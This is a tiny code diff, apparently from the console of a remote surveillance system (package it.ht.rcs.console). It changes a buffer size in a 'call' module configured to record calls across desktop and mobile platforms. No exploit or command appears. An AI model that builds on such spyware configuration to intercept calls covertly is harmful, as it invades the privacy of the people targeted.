@@ -47,7 +47,7 @@ package it.ht.rcs.console
         {
           module: "call",
           record: true,
-          buffer: 524288,
+          buffer: 512000,
           compression: 5,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
